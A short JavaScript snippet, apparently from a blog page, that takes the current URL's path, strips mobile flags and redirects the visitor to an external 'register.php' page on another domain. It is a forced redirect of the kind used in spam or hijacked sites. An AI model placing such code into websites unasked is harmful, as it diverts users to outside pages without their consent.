var urlmain = document.URL;
var param = document.URL.split("/")[3].replace("?m=1","").replace("?m=0","");
var dataUrl = ["//me.yice.pro/register.php"];
var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
window.location = randomItem + param;
